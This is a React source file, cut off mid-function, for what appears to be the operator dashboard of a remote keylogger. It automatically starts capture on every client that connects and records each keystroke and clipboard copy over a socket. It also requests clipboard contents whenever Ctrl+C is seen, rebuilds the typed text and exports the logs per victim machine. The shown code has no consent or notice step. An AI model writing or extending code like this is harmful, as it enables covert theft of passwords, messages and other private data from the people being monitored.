import React, { useState, useEffect, useRef, useCallback } from 'react';

const KeyboardCapture = ({ socket, selectedSession, connected, onCapturingChange }) => {
  // Map<clientId, {keyboardText, copyHistory, isCapturing, lastUpdate}>
  // copyHistory is an array of {text, timestamp}
  const [activeClients, setActiveClients] = useState(new Map());
  const [keyboardClients, setKeyboardClients] = useState([]);
  const [selectedKeyboardClient, setSelectedKeyboardClient] = useState('');
  const [manualClientId, setManualClientId] = useState('');
  const [activeTab, setActiveTab] = useState('keyboard'); // 'keyboard' or 'copy'
  const [showOnlyActive, setShowOnlyActive] = useState(false); // Filter to show only active clients
  const [exportedFiles, setExportedFiles] = useState([]); // List of exported files metadata
  
  // Store text history per client/session
  const textHistoryRef = useRef(new Map()); // Map<clientId, keyboardText>
  const copyHistoryRef = useRef(new Map()); // Map<clientId, copyHistory array>
  const activeClientsRef = useRef(new Set()); // Track which clients are actively capturing
  const clientInfoCacheRef = useRef(new Map()); // Map<clientId, {label, platform, arch}> - persistent cache
  const storageKey = 'keyboard_detection_data'; // localStorage key
  const copyStorageKey = 'keyboard_copy_data'; // localStorage key for copy history
  const exportedFilesKey = 'keyboard_exported_files'; // localStorage key for exported files metadata
  const MAX_STORAGE_SIZE = 2 * 1024 * 1024; // 2MB limit per client (approximate)

  // Load data from localStorage on mount
  useEffect(() => {
    try {
      const saved = localStorage.getItem(storageKey);
      const savedCopy = localStorage.getItem(copyStorageKey);
      
      const clientsMap = new Map();
      
      // Load keyboard text
      if (saved) {
        const data = JSON.parse(saved);
        Object.entries(data).forEach(([clientId, clientData]) => {
          const existing = clientsMap.get(clientId) || { keyboardText: '', copyHistory: [], isCapturing: false, lastUpdate: new Date().toISOString() };
          clientsMap.set(clientId, {
            ...existing,
            keyboardText: clientData.text || clientData.keyboardText || '',
            lastUpdate: clientData.lastUpdate || new Date().toISOString()
          });
          textHistoryRef.current.set(clientId, clientData.text || clientData.keyboardText || '');
        });
      }
      
      // Load copy history
      if (savedCopy) {
        const copyData = JSON.parse(savedCopy);
        Object.entries(copyData).forEach(([clientId, copyHistory]) => {
          const existing = clientsMap.get(clientId) || { keyboardText: '', copyHistory: [], isCapturing: false, lastUpdate: new Date().toISOString() };
          const historyArray = Array.isArray(copyHistory) ? copyHistory : [];
          clientsMap.set(clientId, {
            ...existing,
            copyHistory: historyArray
          });
          copyHistoryRef.current.set(clientId, historyArray);
        });
      }
      
      if (clientsMap.size > 0) {
        setActiveClients(clientsMap);
        console.log('Loaded saved data for', clientsMap.size, 'clients');
      }
    } catch (error) {
      console.error('Error loading from localStorage:', error);
    }
  }, []);

  // Function to calculate approximate data size
  const calculateDataSize = (data) => {
    try {
      return new Blob([JSON.stringify(data)]).size;
    } catch (e) {
      // Fallback: estimate based on string length
      return JSON.stringify(data).length * 2; // Rough estimate (2 bytes per char for UTF-16)
    }
  };

  // Function to export client data to text file
  const exportClientDataToFile = useCallback((clientId, clientData, clientInfo) => {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const clientName = clientInfo?.label || clientId;
    const fileName = `keyboard-capture-${clientName}-${timestamp}.txt`;
    
    let fileContent = `Keyboard Capture Data Export\n`;
    fileContent += `================================\n\n`;
    fileContent += `Client ID: ${clientId}\n`;
    fileContent += `Client Name: ${clientName}\n`;
    if (clientInfo) {
      fileContent += `Platform: ${clientInfo.platform}/${clientInfo.arch}\n`;
    }
    fileContent += `Export Date: ${new Date().toLocaleString()}\n`;
    fileContent += `\n${'='.repeat(50)}\n\n`;
    
    // Add keyboard text
    if (clientData.keyboardText) {
      fileContent += `KEYBOARD TYPING HISTORY\n`;
      fileContent += `${'-'.repeat(50)}\n\n`;
      fileContent += clientData.keyboardText;
      fileContent += `\n\n${'='.repeat(50)}\n\n`;
    }
    
    // Add copy history
    if (clientData.copyHistory && clientData.copyHistory.length > 0) {
      fileContent += `COPY HISTORY (${clientData.copyHistory.length} entries)\n`;
      fileContent += `${'-'.repeat(50)}\n\n`;
      clientData.copyHistory.forEach((entry, index) => {
        const entryDate = new Date(entry.timestamp).toLocaleString();
        fileContent += `[${index + 1}] [${entryDate}]\n`;
        fileContent += `${entry.text}\n`;
        fileContent += `\n${'-'.repeat(50)}\n\n`;
      });
    }
    
    // Create and download file
    const blob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = fileName;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    
    // Save metadata about exported file
    const fileMetadata = {
      clientId,
      clientName,
      fileName,
      exportDate: new Date().toISOString(),
      keyboardTextLength: clientData.keyboardText?.length || 0,
      copyHistoryCount: clientData.copyHistory?.length || 0
    };
    
    setExportedFiles((prev) => {
      const updated = [...prev, fileMetadata];
      try {
        localStorage.setItem(exportedFilesKey, JSON.stringify(updated));
      } catch (e) {
        console.error('Error saving exported files metadata:', e);
      }
      return updated;
    });
    
    console.log(`Exported data for client ${clientId} to ${fileName}`);
    return fileMetadata;
  }, [exportedFilesKey]);

  // Save keyboard text to localStorage whenever activeClients changes
  // Also check if data is too large and export if needed
  useEffect(() => {
    try {
      const dataToSave = {};
      const copyDataToSave = {};
      const clientsToExport = [];
      
      activeClients.forEach((value, key) => {
        const clientData = {
          keyboardText: value.keyboardText || '',
          copyHistory: value.copyHistory || [],
          lastUpdate: value.lastUpdate
        };
        
        // Calculate size for this client's data
        const size = calculateDataSize(clientData);
        
        // If data is too large, export it and clear from memory
        if (size > MAX_STORAGE_SIZE) {
          console.warn(`Client ${key} data is too large (${(size / 1024 / 1024).toFixed(2)}MB), exporting to file...`);
          const clientInfo = keyboardClients.find(c => c.clientId === key) || clientInfoCacheRef.current.get(key);
          clientsToExport.push({ clientId: key, clientData: value, clientInfo });
          
          // Clear the data but keep metadata
          dataToSave[key] = {
            keyboardText: '', // Clear large text
            lastUpdate: value.lastUpdate,
            exported: true, // Mark as exported
            exportDate: new Date().toISOString()
          };
          copyDataToSave[key] = []; // Clear copy history
        } else {
          // Normal save
          dataToSave[key] = {
            keyboardText: value.keyboardText || '',
            lastUpdate: value.lastUpdate
          };
          copyDataToSave[key] = value.copyHistory || [];
        }
      });
      
      // Export large files
      if (clientsToExport.length > 0) {
        clientsToExport.forEach(({ clientId, clientData, clientInfo }) => {
          exportClientDataToFile(clientId, clientData, clientInfo);
          
          // Clear from refs
          textHistoryRef.current.set(clientId, '');
          copyHistoryRef.current.set(clientId, []);
        });
      }
      
      // Save to localStorage
      localStorage.setItem(storageKey, JSON.stringify(dataToSave));
      localStorage.setItem(copyStorageKey, JSON.stringify(copyDataToSave));
      
      // Update state if we exported any clients
      if (clientsToExport.length > 0) {
        setActiveClients((prev) => {
          const newMap = new Map(prev);
          clientsToExport.forEach(({ clientId }) => {
            if (newMap.has(clientId)) {
              const existing = newMap.get(clientId);
              newMap.set(clientId, {
                ...existing,
                keyboardText: '',
                copyHistory: [],
                exported: true,
                exportDate: new Date().toISOString()
              });
            }
          });
          return newMap;
        });
      }
    } catch (error) {
      console.error('Error saving to localStorage:', error);
      // If localStorage is full, try to export all data
      if (error.name === 'QuotaExceededError' || error.message.includes('quota')) {
        console.warn('localStorage quota exceeded, exporting all client data...');
        activeClients.forEach((value, key) => {
          const clientInfo = keyboardClients.find(c => c.clientId === key) || clientInfoCacheRef.current.get(key);
          exportClientDataToFile(key, value, clientInfo);
        });
        
        // Clear localStorage
        try {
          localStorage.removeItem(storageKey);
          localStorage.removeItem(copyStorageKey);
        } catch (e) {
          console.error('Error clearing localStorage:', e);
        }
      }
    }
  }, [activeClients, exportClientDataToFile, keyboardClients]);

  // Define startCaptureForClient using useCallback
  const startCaptureForClient = useCallback((clientId) => {
    if (!socket || !socket.connected) {
      console.log('Cannot start capture: socket not connected');
      return;
    }
    
    if (!clientId) {
      console.log('Cannot start capture: no client ID provided');
      return;
    }
    
    // Skip if already capturing
    if (activeClientsRef.current.has(clientId)) {
      console.log('Already capturing for client:', clientId);
      return;
    }
    
    console.log('Starting capture for clientId:', clientId);
    
    // Initialize client data if not exists
    setActiveClients((prev) => {
      const newMap = new Map(prev);
      if (!newMap.has(clientId)) {
        const savedText = textHistoryRef.current.get(clientId) || '';
        const savedCopyHistory = copyHistoryRef.current.get(clientId) || [];
        newMap.set(clientId, {
          keyboardText: savedText,
          copyHistory: savedCopyHistory,
          isCapturing: true,
          lastUpdate: new Date().toISOString()
        });
      } else {
        newMap.set(clientId, {
          ...newMap.get(clientId),
          isCapturing: true
        });
      }
      return newMap;
    });
    
    activeClientsRef.current.add(clientId);
    
    try {
      socket.emit('admin:start', { clientId: clientId });
      if (onCapturingChange) onCapturingChange(true);
    } catch (error) {
      console.error('Error starting capture:', error);
      activeClientsRef.current.delete(clientId);
      setActiveClients((prev) => {
        const newMap = new Map(prev);
        if (newMap.has(clientId)) {
          newMap.set(clientId, {
            ...newMap.get(clientId),
            isCapturing: false
          });
        }
        return newMap;
      });
    }
  }, [socket, onCapturingChange]);

  // Fetch keyboard clients list and auto-start capture for all
  useEffect(() => {
    if (!socket || !connected) return;

    const fetchKeyboardClients = () => {
      socket.emit('keyboard:list');
    };

    const handleKeyboardList = (clients) => {
      const clientsArray = Array.isArray(clients) ? clients : [];
      setKeyboardClients(clientsArray);
      
      // Cache client info for persistent display even after disconnection
      clientsArray.forEach((client) => {
        const clientId = client.clientId;
        if (clientId) {
          clientInfoCacheRef.current.set(clientId, {
            label: client.label || clientId,
            platform: client.platform || 'unknown',
            arch: client.arch || 'unknown'
          });
        }
      });
      
      // Auto-start capture for all new clients
      clientsArray.forEach((client) => {
        const clientId = client.clientId;
        
        // Only start if not already capturing
        if (!activeClientsRef.current.has(clientId)) {
          console.log('Auto-starting capture for client:', clientId);
          startCaptureForClient(clientId);
        }
      });
    };

    socket.on('keyboard:list', handleKeyboardList);

    fetchKeyboardClients();
    const interval = setInterval(fetchKeyboardClients, 5000); // Refresh every 5 seconds

    return () => {
      socket.off('keyboard:list');
      clearInterval(interval);
    };
  }, [socket, connected, startCaptureForClient]);

  // Debug: Log all socket events to see what's coming through
  useEffect(() => {
    if (!socket || !socket.connected) return;

    // Add one-time listeners for all possible event names
    const debugHandler = (eventName) => {
      return (data) => {
        console.log(`🔍 Received socket event '${eventName}':`, data);
      };
    };

    // Listen to various possible event names
    const events = ['clipboard:copy', 'clipboard_copy', 'clipboardCopy', 'key:forward', 'key:event'];
    events.forEach(eventName => {
      socket.on(eventName, debugHandler(eventName));
    });

    return () => {
      events.forEach(eventName => {
        socket.off(eventName, debugHandler(eventName));
      });
    };
  }, [socket, connected]);

  // Handle clipboard copy events from server
  useEffect(() => {
    if (!socket || !socket.connected) return;

    const handleClipboardCopy = (payload) => {
      console.log('✅✅✅ DEBUG: Received clipboard:copy event:', payload);
      console.log('✅ Payload type:', typeof payload);
      console.log('✅ Payload keys:', payload ? Object.keys(payload) : 'null');
      
      const clientId = payload?.clientId || payload?.client_id;
      const copiedText = payload?.copiedText || payload?.clipboardText || payload?.text;
      
      console.log('✅ Extracted clientId:', clientId, 'copiedText:', copiedText);
      
      if (!clientId) {
        console.error('❌ No clientId in clipboard:copy payload:', payload);
        return;
      }
      
      if (!copiedText) {
        console.warn('⚠️ No clipboard text received for client:', clientId);
        return;
      }
      
      console.log('✅ Checking if client is active. clientId:', clientId, 'Active clients:', Array.from(activeClientsRef.current));
      console.log('✅ Current activeClients state keys:', Array.from(activeClients.keys()));
      
      // IMPORTANT: Auto-add client to active list if not already there
      // This handles cases where clipboard events arrive before keyboard events
      if (!activeClientsRef.current.has(clientId)) {
        console.log('⚠️ Client not in active list, auto-adding for clipboard:', clientId);
        activeClientsRef.current.add(clientId);
        
        // Initialize client data if it doesn't exist
        setActiveClients((prev) => {
          const newMap = new Map(prev);
          if (!newMap.has(clientId)) {
            newMap.set(clientId, {
              keyboardText: '',
              copyHistory: [],
              isCapturing: true,
              lastUpdate: new Date().toISOString()
            });
            console.log('✅ Initialized new client data for:', clientId);
          }
          return newMap;
        });
      }
      
      console.log('✅ Processing clipboard copy for client:', clientId, 'text:', copiedText, 'length:', copiedText.length);
      
      // Add copied text to copy history only (not to keyboard view)
      setActiveClients((prev) => {
        console.log('✅ setActiveClients called, prev state:', prev);
        const newMap = new Map(prev);
        const clientData = newMap.get(clientId) || { 
          keyboardText: '', 
          copyHistory: [], 
          isCapturing: true, 
          lastUpdate: new Date().toISOString() 
        };
        
        console.log('✅ Current clientData for', clientId, ':', clientData);
        console.log('✅ Current copyHistory length:', clientData.copyHistory?.length || 0);
        
        // Add to copy history only
        const newCopyEntry = {
          text: copiedText,
          timestamp: new Date().toISOString()
        };
        const updatedCopyHistory = [...(clientData.copyHistory || []), newCopyEntry];
        
        console.log('✅ New copyHistory length:', updatedCopyHistory.length);
        console.log('✅ New copy entry:', newCopyEntry);
        
        // Keep keyboard text unchanged - copied text only goes to copy history
        const keyboardText = clientData.keyboardText || '';
        
        const updatedClientData = {
          ...clientData,
          keyboardText: keyboardText, // Keep original keyboard text
          copyHistory: updatedCopyHistory,
          lastUpdate: new Date().toISOString()
        };
        
        newMap.set(clientId, updatedClientData);
        
        // Update refs
        textHistoryRef.current.set(clientId, keyboardText);
        copyHistoryRef.current.set(clientId, updatedCopyHistory);
        
        console.log('✅✅✅ Added copied text to copy history for client:', clientId);
        console.log('✅✅✅ Updated clientData:', updatedClientData);
        console.log('✅✅✅ New map size:', newMap.size);
        console.log('✅✅✅ Client in new map?', newMap.has(clientId));
        console.log('✅✅✅ Copy history in new map:', newMap.get(clientId)?.copyHistory);
        console.log('✅✅✅ Copy history length:', newMap.get(clientId)?.copyHistory?.length);
        console.log('✅✅✅ Selected client ID:', selectedKeyboardClient || manualClientId || selectedSession);
        console.log('✅✅✅ Does selected client match?', (selectedKeyboardClient || manualClientId || selectedSession) === clientId);
        
        return newMap;
      });
    };

    // Listen to all possible clipboard event names
    socket.on('clipboard:copy', handleClipboardCopy);
    socket.on('clipboard_copy', handleClipboardCopy);
    socket.on('clipboardCopy', handleClipboardCopy);
    socket.on('clipboard-copy', handleClipboardCopy);
    
    console.log('✅ Registered clipboard:copy listener (and variants)');
    
    // Also listen to key:event in case clipboard is sent that way
    socket.on('key:event', (payload) => {
      if (payload && (payload.type === 'clipboard' || payload.copiedText || payload.clipboardText)) {
        console.log('🎯🎯🎯 Received clipboard via key:event:', payload);
        handleClipboardCopy(payload);
      }
    });
    
    console.log('✅ Also listening to key:event for clipboard data');

    return () => {
      if (socket && socket.off) {
        socket.off('clipboard:copy', handleClipboardCopy);
        socket.off('clipboard_copy', handleClipboardCopy);
        socket.off('clipboardCopy', handleClipboardCopy);
        console.log('Unregistered clipboard:copy listeners');
      }
    };
  }, [socket, connected]);

  // Handle key:forward events for all active clients
  useEffect(() => {
    if (!socket || !socket.connected) return;

    const handleKeyForward = (payload) => {
      console.log('🔍🔍🔍 handleKeyForward called with payload:', payload);
      console.log('🔍 Payload keys:', payload ? Object.keys(payload) : 'null');
      console.log('🔍 Payload type:', payload?.type);
      console.log('🔍 Payload clientId:', payload?.clientId);
      console.log('🔍 Payload copiedText:', payload?.copiedText);
      console.log('🔍 Payload clipboardText:', payload?.clipboardText);
      
      const clientId = payload?.clientId || payload?.client_id;
      
      // Check if this is a clipboard event (type: 'clipboard' OR has clipboard data)
      if (payload.type === 'clipboard' || payload.copiedText || payload.clipboardText) {
        const copiedText = payload.clipboardText || payload.copiedText || payload.text;
        console.log('✅✅✅ Clipboard event detected in key:forward for client:', clientId, 'text:', copiedText);
        
        if (!clientId) {
          console.error('❌ No clientId in clipboard event');
          return;
        }
        
        if (!copiedText || !copiedText.trim()) {
          console.warn('⚠️ No clipboard text in clipboard event, copiedText:', copiedText);
          return;
        }
        
        console.log('✅✅✅ Processing clipboard event, copiedText length:', copiedText.length);
        
        // IMPORTANT: Auto-add client to active list if not already there
        if (!activeClientsRef.current.has(clientId)) {
          console.log('⚠️ Client not in active list, auto-adding for clipboard:', clientId);
          activeClientsRef.current.add(clientId);
          
          // Initialize client data if it doesn't exist
          setActiveClients((prev) => {
            const newMap = new Map(prev);
            if (!newMap.has(clientId)) {
              newMap.set(clientId, {
                keyboardText: '',
                copyHistory: [],
                isCapturing: true,
                lastUpdate: new Date().toISOString()
              });
            }
            return newMap;
          });
        }
        
        // Process it as clipboard copy
        console.log('✅ Client is active, processing clipboard data');
        setActiveClients((prev) => {
          const newMap = new Map(prev);
          const clientData = newMap.get(clientId) || { 
            keyboardText: '', 
            copyHistory: [], 
            isCapturing: true, 
            lastUpdate: new Date().toISOString() 
          };
          
          const newCopyEntry = {
            text: copiedText,
            timestamp: new Date().toISOString()
          };
          const updatedCopyHistory = [...(clientData.copyHistory || []), newCopyEntry];
          
          // Keep keyboard text unchanged - copied text only goes to copy history
          const keyboardText = clientData.keyboardText || '';
          
          newMap.set(clientId, {
            ...clientData,
            keyboardText: keyboardText, // Keep original keyboard text
            copyHistory: updatedCopyHistory,
            lastUpdate: new Date().toISOString()
          });
          
          textHistoryRef.current.set(clientId, keyboardText);
          copyHistoryRef.current.set(clientId, updatedCopyHistory);
          
          console.log('✅ Added clipboard text to copy history from key:forward event');
          console.log('✅ Updated copy history length:', updatedCopyHistory.length);
          
          return newMap;
        });
        return; // Don't process as keyboard event
      }
      
      // Check if clipboard data is included in key event (fallback)
      if (payload.clipboardText || payload.copiedText) {
        const copiedText = payload.clipboardText || payload.copiedText;
        console.log('✅ Clipboard data found in key:forward event (fallback):', copiedText);
        
        if (!clientId) {
          console.error('❌ No clientId in key event with clipboard data');
          return;
        }
        
        // Process it as clipboard copy
        if (activeClientsRef.current.has(clientId) && copiedText) {
          console.log('✅ Client is active, processing clipboard data (fallback)');
          setActiveClients((prev) => {
            const newMap = new Map(prev);
            const clientData = newMap.get(clientId) || { 
              keyboardText: '', 
              copyHistory: [], 
              isCapturing: true, 
              lastUpdate: new Date().toISOString() 
            };
            
            const newCopyEntry = {
              text: copiedText,
              timestamp: new Date().toISOString()
            };
            const updatedCopyHistory = [...(clientData.copyHistory || []), newCopyEntry];
            
            // Keep keyboard text unchanged - copied text only goes to copy history
            const keyboardText = clientData.keyboardText || '';
            
            newMap.set(clientId, {
              ...clientData,
              keyboardText: keyboardText, // Keep original keyboard text
              copyHistory: updatedCopyHistory,
              lastUpdate: new Date().toISOString()
            });
            
            textHistoryRef.current.set(clientId, keyboardText);
            copyHistoryRef.current.set(clientId, updatedCopyHistory);
            
            console.log('✅ Added clipboard text to copy history from key:forward event (fallback)');
            
            return newMap;
          });
        } else {
          console.warn('⚠️ Client not in active list (fallback):', clientId, 'Active clients:', Array.from(activeClientsRef.current));
        }
        return; // Don't process as keyboard event
      }
      
      // Check if this client is actively capturing
      if (!activeClientsRef.current.has(clientId)) {
        console.log('Ignoring: client not in active list', clientId);
        return;
      }
      
      // Only process keydown events
      if (payload.type !== 'keydown') {
        return;
      }
      
      // Filter out invalid keycode 255
      if (payload.keyCode === 255) {
        return;
      }
      
      // Detect Ctrl+C or Cmd+C (copy operation)
      const isCopy = (payload.keyCode === 67 || payload.keyCode === 99) && (payload.ctrlKey || payload.metaKey);
      
      // Also check if clipboard data is in the keychar (fallback method from Python)
      const clipboardInKeychar = isCopy && payload.keychar && payload.keychar.length > 1 && 
                                 payload.keychar !== 'c' && payload.keychar !== 'C';
      
      if (isCopy) {
        console.log('Copy operation detected for client:', clientId);
        
        // Check if clipboard data is already in the payload (multiple possible locations)
        const copiedText = payload.clipboardText || payload.copiedText || 
                          (clipboardInKeychar ? payload.keychar : null);
        
        if (copiedText) {
          // Clipboard data is in the payload, add it to keyboard text and copy history
          setActiveClients((prev) => {
            const newMap = new Map(prev);
            const clientData = newMap.get(clientId) || { 
              keyboardText: '', 
              copyHistory: [], 
              isCapturing: true, 
              lastUpdate: new Date().toISOString() 
            };
            
            // Add to copy history only
            const newCopyEntry = {
              text: copiedText,
              timestamp: new Date().toISOString()
            };
            const updatedCopyHistory = [...(clientData.copyHistory || []), newCopyEntry];
            
            // Keep keyboard text unchanged - copied text only goes to copy history
            const keyboardText = clientData.keyboardText || '';
            
            newMap.set(clientId, {
              ...clientData,
              keyboardText: keyboardText, // Keep original keyboard text
              copyHistory: updatedCopyHistory,
              lastUpdate: new Date().toISOString()
            });
            
            textHistoryRef.current.set(clientId, keyboardText);
            copyHistoryRef.current.set(clientId, updatedCopyHistory);
            console.log('Copy text included in payload, added to copy history only:', copiedText);
            
            return newMap;
          });
        } else {
          // Copy operation detected but no clipboard data yet
          // Don't add anything to keyboard text - copy will be recorded in copy history when clipboard data arrives
          // Request clipboard content from server
          if (socket && socket.connected) {
            try {
              socket.emit('clipboard:request', { clientId: clientId });
            } catch (error) {
              console.error('Error requesting clipboard:', error);
            }
          }
        }
        
        return;
      }
      
      console.log('Processing key event for client:', clientId, 'keychar:', payload.keychar, 'keyCode:', payload.keyCode);
      
      // Update keyboard text for this specific client
      setActiveClients((prev) => {
        const newMap = new Map(prev);
        const clientData = newMap.get(clientId) || { 
          keyboardText: '', 
          copyHistory: [], 
          isCapturing: true, 
          lastUpdate: new Date().toISOString() 
        };
        const currentText = clientData.keyboardText || '';
        const newText = applyKeyToText(currentText, payload);
        
        if (newText !== currentText) {
          newMap.set(clientId, {
            ...clientData,
            keyboardText: newText,
            lastUpdate: new Date().toISOString()
          });
          
          // Also update ref for quick access
          textHistoryRef.current.set(clientId, newText);
          
          console.log('Updated keyboard text for client:', clientId, 'length:', newText.length);
        }
        
        return newMap;
      });
    };

    // Listen to both key:forward and key:event (Python client emits key:event)
    socket.on('key:forward', handleKeyForward);
    socket.on('key:event', handleKeyForward);
    console.log('✅ Registered key:forward and key:event listeners for all active clients');

    return () => {
      if (socket && socket.off) {
        socket.off('key:forward', handleKeyForward);
        socket.off('key:event', handleKeyForward);
        console.log('Unregistered key event listeners');
      }
    };
  }, [socket, connected]);


  const stopCaptureForClient = useCallback((clientId) => {
    if (!socket || !socket.connected) return;
    
    if (!clientId) {
      // Stop all if no client specified
      activeClientsRef.current.forEach((id) => {
        try {
          socket.emit('admin:stop', { clientId: id });
        } catch (error) {
          console.error('Error stopping capture for client:', id, error);
        }
      });
      activeClientsRef.current.clear();
      setActiveClients((prev) => {
        const newMap = new Map(prev);
        newMap.forEach((value, key) => {
          newMap.set(key, { 
            keyboardText: value.keyboardText || '',
            copyHistory: value.copyHistory || [],
            isCapturing: false,
            lastUpdate: value.lastUpdate
          });
        });
        return newMap;
      });
      if (onCapturingChange) onCapturingChange(false);
      return;
    }
    
    try {
      socket.emit('admin:stop', { clientId: clientId });
      activeClientsRef.current.delete(clientId);
      setActiveClients((prev) => {
        const newMap = new Map(prev);
        if (newMap.has(clientId)) {
          const clientData = newMap.get(clientId);
          newMap.set(clientId, {
            keyboardText: clientData.keyboardText || '',
            copyHistory: clientData.copyHistory || [],
            isCapturing: false,
            lastUpdate: clientData.lastUpdate
          });
        }
        return newMap;
      });
      
      if (activeClientsRef.current.size === 0 && onCapturingChange) {
        onCapturingChange(false);
      }
    } catch (error) {
      console.error('Error stopping capture:', error);
    }
  }, [socket, connected, onCapturingChange]);

  // Remove a client completely (stop capture and remove from list)
  const removeClient = useCallback((clientId) => {
    if (!clientId) return;
    
    // First stop capture if it's active
    if (activeClientsRef.current.has(clientId)) {
      stopCaptureForClient(clientId);
    }
    
    // Remove from activeClientsRef
    activeClientsRef.current.delete(clientId);
    
    // Remove from activeClients state
    setActiveClients((prev) => {
      const newMap = new Map(prev);
      newMap.delete(clientId);
      return newMap;
    });
    
    // Remove from localStorage
    try {
      const savedText = localStorage.getItem(`keyboard_text_${clientId}`);
      const savedCopyHistory = localStorage.getItem(`copy_history_${clientId}`);
      if (savedText) localStorage.removeItem(`keyboard_text_${clientId}`);
      if (savedCopyHistory) localStorage.removeItem(`copy_history_${clientId}`);
    } catch (error) {
      console.error('Error removing from localStorage:', error);
    }
    
    // Remove from refs
    textHistoryRef.current.delete(clientId);
    copyHistoryRef.current.delete(clientId);
    clientInfoCacheRef.current.delete(clientId); // Remove from cache too
    
    // Clear selection if this was the selected client
    if (selectedKeyboardClient === clientId) {
      setSelectedKeyboardClient(null);
    }
    if (manualClientId === clientId) {
      setManualClientId('');
    }
    
    // Update capturing state if no clients left
    if (activeClientsRef.current.size === 0 && onCapturingChange) {
      onCapturingChange(false);
    }
    
    console.log('Removed client:', clientId);
  }, [stopCaptureForClient, selectedKeyboardClient, manualClientId, onCapturingChange]);

  function applyKeyToText(prev, e) {
    // Check for modifier keys
    const hasCtrl = e.ctrlKey || e.metaKey; // metaKey is Cmd on Mac
    const hasAlt = e.altKey;
    const hasShift = e.shiftKey;
    
    // Skip events with Ctrl or Alt pressed (don't show modifier combinations)
    if (hasCtrl || hasAlt) {
      return prev; // Ignore modifier combinations
    }
    
    // Skip shift key itself (keyCode 16) - only use shift state for case conversion
    if (e.keyCode === 16) {
      return prev; // Ignore shift key press
    }
    
    // Map arrow keyCodes to arrow symbols
    const arrowKeys = {
      37: '←', // Left
      38: '↑', // Up
      39: '→', // Right
      40: '↓'  // Down
    };
    
    // Handle arrow keys with arrow symbols
    if (arrowKeys[e.keyCode]) {
      console.log('Adding arrow key:', arrowKeys[e.keyCode]);
      return prev + arrowKeys[e.keyCode];
    }
    
    // Map other keyCodes to special key names
    const specialKeys = {
      8: 'Backspace',
      9: 'Tab',
      13: 'Enter',
      27: 'Esc',
      32: 'Space',
      33: 'PageUp',
      34: 'PageDown',
      35: 'End',
      36: 'Home',
      45: 'Insert',
      46: 'Delete',
      112: 'F1', 113: 'F2', 114: 'F3', 115: 'F4',
      116: 'F5', 117: 'F6', 118: 'F7', 119: 'F8',
      120: 'F9', 121: 'F10', 122: 'F11', 123: 'F12'
    };
    
    // Handle other special keys
    if (specialKeys[e.keyCode]) {
      const keyName = specialKeys[e.keyCode];
      // For navigation keys, show as [KeyName]
      if ([33, 34, 35, 36, 45, 46].includes(e.keyCode)) {
        console.log('Adding special key:', `[${keyName}]`);
        return prev + `[${keyName}]`;
      }
      // For function keys
      if (e.keyCode >= 112 && e.keyCode <= 123) {
        console.log('Adding function key:', `[${keyName}]`);
        return prev + `[${keyName}]`;
      }
      // For Enter, Tab, Esc - handle normally
      if (e.keyCode === 13) return prev + '\n';
      if (e.keyCode === 9) return prev + '\t';
      if (e.keyCode === 27) return prev + '[Esc]';
      if (e.keyCode === 8) {
        // Backspace: only remove characters on current line, don't remove newlines
        if (prev.length === 0) return prev;
        
        // Find the last newline position
        const lastNewlineIndex = prev.lastIndexOf('\n');
        
        if (lastNewlineIndex === -1) {
          // No newline found, remove last character
          const result = prev.slice(0, -1);
          console.log('Backspace: removed one character');
          return result;
        } else {
          // There's a newline, only remove characters after the last newline
          const currentLine = prev.substring(lastNewlineIndex + 1);
          if (currentLine.length > 0) {
            // Remove last character from current line
            const result = prev.substring(0, lastNewlineIndex + 1) + currentLine.slice(0, -1);
            console.log('Backspace: removed one character from current line');
            return result;
          } else {
            // Current line is empty, don't remove the newline
            console.log('Backspace: cannot remove newline');
            return prev;
          }
        }
      }
      if (e.keyCode === 32) return prev + ' ';
    }
    
    // PRIORITIZE keychar over keyCode - this is critical for Linux
    // On Linux, keyCode can be incorrect (F-keys, navigation keys), but keychar is reliable
    const hasKeychar = e.keychar !== null && e.keychar !== undefined && e.keychar !== '';
    
    if (hasKeychar) {
      // If keychar is a string (character), use it directly - this is the most reliable
      if (typeof e.keychar === 'string' && e.keychar.length > 0) {
        // Apply shift for case (though keychar should already be correct)
        let char = e.keychar;
        if (hasShift && char.length === 1 && char.match(/[a-z]/)) {
          char = char.toUpperCase();
        } else if (!hasShift && char.length === 1 && char.match(/[A-Z]/)) {
          char = char.toLowerCase();
        }
        console.log('Adding string keychar:', JSON.stringify(char));
        return prev + char;
      }
      // If keychar is a number, convert it
      if (typeof e.keychar === 'number') {
        const ch = e.keychar;
        if (ch === 13 || ch === 10) return prev + '\n';
        if (ch === 8) {
          // Backspace: only remove characters on current line, don't remove newlines
          if (prev.length === 0) return prev;
          const lastNewlineIndex = prev.lastIndexOf('\n');
          if (lastNewlineIndex === -1) {
            return prev.slice(0, -1);
          } else {
            const currentLine = prev.substring(lastNewlineIndex + 1);
            if (currentLine.length > 0) {
              return prev.substring(0, lastNewlineIndex + 1) + currentLine.slice(0, -1);
            } else {
              return prev; // Don't remove newline
            }
          }
        }
        if (ch === 9) return prev + '\t';
        if (ch === 32) return prev + ' ';
        if (ch >= 32 && ch <= 126) {
          const char = String.fromCharCode(ch);
          return prev + char;
        }
      }
    }
    
    // Fallback: try to use keyCode for printable characters
    // BUT: Skip if keyCode is in F-key range (112-123) or navigation range (33-46)
    // These are often incorrect on Linux
    if (e.keyCode && e.keyCode !== 255 && e.keyCode > 0) {
      // Skip F-keys and navigation keys if we don't have keychar (likely incorrect)
      if (!hasKeychar && (e.keyCode >= 112 && e.keyCode <= 123)) {
        console.log('Skipping F-key keyCode (likely incorrect):', e.keyCode);
        return prev;
      }
      if (!hasKeychar && (e.keyCode >= 33 && e.keyCode <= 46 && e.keyCode !== 32)) {
        console.log('Skipping navigation keyCode (likely incorrect):', e.keyCode);
        return prev;
      }
      
      if (e.keyCode === 13 || e.keyCode === 10) return prev + '\n';
      if (e.keyCode === 8) {
        // Backspace: only remove characters on current line, don't remove newlines
        if (prev.length === 0) return prev;
        const lastNewlineIndex = prev.lastIndexOf('\n');
        if (lastNewlineIndex === -1) {
          return prev.slice(0, -1);
        } else {
          const currentLine = prev.substring(lastNewlineIndex + 1);
          if (currentLine.length > 0) {
            return prev.substring(0, lastNewlineIndex + 1) + currentLine.slice(0, -1);
          } else {
            return prev; // Don't remove newline
          }
        }
      }
      if (e.keyCode === 9) return prev + '\t';
